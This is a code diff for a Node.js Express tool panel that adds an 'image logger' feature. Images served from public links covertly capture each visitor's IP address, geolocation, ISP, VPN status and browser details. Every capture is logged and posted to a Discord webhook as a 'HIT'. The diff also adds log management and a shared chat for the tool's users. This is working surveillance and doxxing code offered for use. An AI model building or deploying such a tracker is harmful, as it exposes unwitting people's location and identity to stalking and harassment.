@@ -6,17 +6,104 @@ const session      = require('express-session');
 const bcrypt       = require('bcrypt');
 const { v4: uuid } = require('uuid');
 const { SocksProxyAgent } = require('socks-proxy-agent');
+const multer = require('multer');
 
 const app  = express();
 const PORT = 5000;
-const USERS_FILE = path.join(__dirname, 'data', 'users.json');
+const USERS_FILE   = path.join(__dirname, 'data', 'users.json');
+const LOGS_FILE    = path.join(__dirname, 'data', 'logs.json');
+const CHAT_FILE    = path.join(__dirname, 'data', 'chat.json');
+const LOGGERS_FILE = path.join(__dirname, 'data', 'loggers.json');
+const CONFIG_FILE  = path.join(__dirname, 'data', 'config.json');
+const UPLOADS_DIR  = path.join(__dirname, 'data', 'uploads');
 
-/* ── ensure data dir ── */
+/* ── ensure data dir + files ── */
 if (!fs.existsSync(path.join(__dirname, 'data'))) fs.mkdirSync(path.join(__dirname, 'data'));
-if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '{}', 'utf8');
+if (!fs.existsSync(UPLOADS_DIR))  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+if (!fs.existsSync(USERS_FILE))   fs.writeFileSync(USERS_FILE,   '{}', 'utf8');
+if (!fs.existsSync(LOGS_FILE))    fs.writeFileSync(LOGS_FILE,    '[]', 'utf8');
+if (!fs.existsSync(CHAT_FILE))    fs.writeFileSync(CHAT_FILE,    '[]', 'utf8');
+if (!fs.existsSync(LOGGERS_FILE)) fs.writeFileSync(LOGGERS_FILE, '{}', 'utf8');
+if (!fs.existsSync(CONFIG_FILE))  fs.writeFileSync(CONFIG_FILE,  '{}', 'utf8');
 
-function loadUsers()       { try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch { return {}; } }
+function loadUsers()       { try { return JSON.parse(fs.readFileSync(USERS_FILE,   'utf8')); } catch { return {}; } }
 function saveUsers(users)  { fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8'); }
+function loadLogs()        { try { return JSON.parse(fs.readFileSync(LOGS_FILE,    'utf8')); } catch { return []; } }
+function saveLogs(l)       { fs.writeFileSync(LOGS_FILE,    JSON.stringify(l), 'utf8'); }
+function loadChat()        { try { return JSON.parse(fs.readFileSync(CHAT_FILE,    'utf8')); } catch { return []; } }
+function saveChat(m)       { fs.writeFileSync(CHAT_FILE,    JSON.stringify(m.slice(-500)), 'utf8'); }
+function loadLoggers()     { try { return JSON.parse(fs.readFileSync(LOGGERS_FILE, 'utf8')); } catch { return {}; } }
+function saveLoggers(l)    { fs.writeFileSync(LOGGERS_FILE, JSON.stringify(l), 'utf8'); }
+function loadConfig()      { try { return JSON.parse(fs.readFileSync(CONFIG_FILE,  'utf8')); } catch { return {}; } }
+function saveConfig(c)     { fs.writeFileSync(CONFIG_FILE,  JSON.stringify(c), 'utf8'); }
+
+/* ── Multer upload ── */
+const multerStorage = multer.diskStorage({
+  destination: UPLOADS_DIR,
+  filename: (req, file, cb) => {
+    const ext = path.extname(file.originalname).toLowerCase() || '.bin';
+    cb(null, uuid() + ext);
+  }
+});
+const upload = multer({
+  storage: multerStorage,
+  limits: { fileSize: 100 * 1024 * 1024 },
+  fileFilter: (req, file, cb) => {
+    cb(null, /\.(jpg|jpeg|png|gif|webp|bmp|svg|avif)$/i.test(file.originalname));
+  }
+});
+
+/* ── IP helpers ── */
+function getClientIP(req) {
+  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
+    || req.socket.remoteAddress || req.ip || '0.0.0.0';
+}
+
+async function geoIP(ip) {
+  try {
+    const r = await axios.get(
+      `http://ip-api.com/json/${ip}?fields=status,country,city,isp,proxy,hosting,query`,
+      { timeout: 4000 }
+    );
+    if (r.data && r.data.status === 'success') {
+      return {
+        ip: r.data.query || ip,
+        country: r.data.country || 'Unknown',
+        city:    r.data.city    || 'Unknown',
+        isp:     r.data.isp     || 'Unknown',
+        isVpn:   !!(r.data.proxy || r.data.hosting),
+      };
+    }
+  } catch {}
+  return { ip, country: 'Unknown', city: 'Unknown', isp: 'Unknown', isVpn: false };
+}
+
+async function sendDiscordWebhook(webhookUrl, log) {
+  if (!webhookUrl) return;
+  const vpnLine = log.isVpn ? 'VPN IP DETECTED' : 'Residential';
+  try {
+    await axios.post(webhookUrl, {
+      embeds: [{
+        title: 'NEW | HIT',
+        description: '/fpeds | credits @vet',
+        color: log.isVpn ? 15158332 : 5763719,
+        fields: [
+          { name: 'IP Address',  value: '`' + log.ip + '`',      inline: true },
+          { name: 'Type',        value: vpnLine,                  inline: true },
+          { name: 'Country',     value: log.country,              inline: true },
+          { name: 'City',        value: log.city,                 inline: true },
+          { name: 'ISP',         value: log.isp,                  inline: true },
+          { name: 'Logger Name', value: log.loggerName,           inline: true },
+        ],
+        footer: { text: '/fpeds · ' + new Date(log.timestamp).toUTCString() },
+        timestamp: log.timestamp,
+      }]
+    }, { timeout: 6000 });
+  } catch {}
+}
+
+/* ── Chat SSE clients ── */
+const chatClients = new Set();
 
 /* ── middleware ── */
 app.use(express.json());
@@ -775,6 +862,150 @@ app.get('/fpeds/osint', requireAuth, (req, res) => {
   }
 
   runScan();
+});
+
+/* ══════════════════════════════════════════
+   IMAGE LOGGER
+══════════════════════════════════════════ */
+
+// Create a logger (upload image)
+app.post('/fpeds/logger/create', requireAuth, upload.single('image'), (req, res) => {
+  if (!req.file) return res.json({ ok: false, error: 'No image uploaded or unsupported type.' });
+  const id = uuid();
+  const loggers = loadLoggers();
+  loggers[id] = {
+    id,
+    name:      (req.body.name || 'Unnamed Logger').slice(0, 80),
+    filename:  req.file.filename,
+    createdBy: req.session.username,
+    createdAt: new Date().toISOString(),
+  };
+  saveLoggers(loggers);
+  res.json({ ok: true, id, url: `/fpeds/l/${id}` });
+});
+
+// Visit logger — public (IP capture endpoint)
+app.get('/fpeds/l/:id', async (req, res) => {
+  const loggers = loadLoggers();
+  const logger  = loggers[req.params.id];
+  if (!logger) return res.status(404).send('Not found');
+
+  const rawIP = getClientIP(req);
+  const ua    = (req.headers['user-agent'] || 'Unknown').slice(0, 300);
+  const geo   = await geoIP(rawIP);
+
+  const entry = {
+    id:         uuid(),
+    loggerId:   logger.id,
+    loggerName: logger.name,
+    ip:         geo.ip,
+    country:    geo.country,
+    city:       geo.city,
+    isp:        geo.isp,
+    isVpn:      geo.isVpn,
+    userAgent:  ua,
+    timestamp:  new Date().toISOString(),
+  };
+
+  const logs = loadLogs();
+  logs.unshift(entry);
+  saveLogs(logs);
+
+  const cfg = loadConfig();
+  sendDiscordWebhook(cfg.webhookUrl, entry); // fire and forget
+
+  const imgPath = path.join(UPLOADS_DIR, logger.filename);
+  if (fs.existsSync(imgPath)) {
+    res.sendFile(imgPath);
+  } else {
+    res.status(404).send('Image file missing');
+  }
+});
+
+// List loggers
+app.get('/fpeds/logger/list', requireAuth, (req, res) => {
+  res.json(loadLoggers());
+});
+
+// Delete a logger
+app.post('/fpeds/logger/delete', requireAuth, (req, res) => {
+  const { id } = req.body;
+  const loggers = loadLoggers();
+  if (loggers[id]) {
+    const img = path.join(UPLOADS_DIR, loggers[id].filename);
+    if (fs.existsSync(img)) { try { fs.unlinkSync(img); } catch {} }
+    delete loggers[id];
+    saveLoggers(loggers);
+  }
+  res.json({ ok: true });
+});
+
+/* ══════════════════════════════════════════
+   LOGS
+══════════════════════════════════════════ */
+app.get('/fpeds/logs/list', requireAuth, (req, res) => {
+  res.json(loadLogs());
+});
+
+app.post('/fpeds/logs/clear', requireAuth, (req, res) => {
+  saveLogs([]);
+  res.json({ ok: true });
+});
+
+/* ══════════════════════════════════════════
+   CONFIG (webhook etc.)
+══════════════════════════════════════════ */
+app.get('/fpeds/config', requireAuth, (req, res) => {
+  res.json(loadConfig());
+});
+
+app.post('/fpeds/config', requireAuth, (req, res) => {
+  const cfg = loadConfig();
+  if (typeof req.body.webhookUrl === 'string') cfg.webhookUrl = req.body.webhookUrl.trim();
+  saveConfig(cfg);
+  res.json({ ok: true });
+});
+
+/* ══════════════════════════════════════════
+   GLOBAL CHAT
+══════════════════════════════════════════ */
+app.get('/fpeds/chat/stream', requireAuth, (req, res) => {
+  res.setHeader('Content-Type',  'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection',    'keep-alive');
+  res.flushHeaders();
+
+  // send history on connect
+  const history = loadChat().slice(-60);
+  res.write(`data: ${JSON.stringify({ type: 'history', messages: history })}\n\n`);
+  // send online count
+  const sendCount = () => {
+    const d = JSON.stringify({ type: 'count', count: chatClients.size + 1 });
+    chatClients.forEach(c => { try { c.write(`data: ${d}\n\n`); } catch {} });
+  };
+
+  chatClients.add(res);
+  sendCount();
+  req.on('close', () => { chatClients.delete(res); sendCount(); });
+});
+
+app.post('/fpeds/chat/send', requireAuth, (req, res) => {
+  const text = (req.body.message || '').trim().slice(0, 500);
+  if (!text) return res.json({ ok: false, error: 'Empty message.' });
+
+  const msg = {
+    id:        uuid(),
+    username:  req.session.username,
+    message:   text,
+    timestamp: new Date().toISOString(),
+  };
+  const msgs = loadChat();
+  msgs.push(msg);
+  saveChat(msgs);
+
+  const data = `data: ${JSON.stringify({ type: 'message', ...msg })}\n\n`;
+  chatClients.forEach(c => { try { c.write(data); } catch {} });
+  res.json({ ok: true });
 });
 
 /* ══════════════════════════════════════════
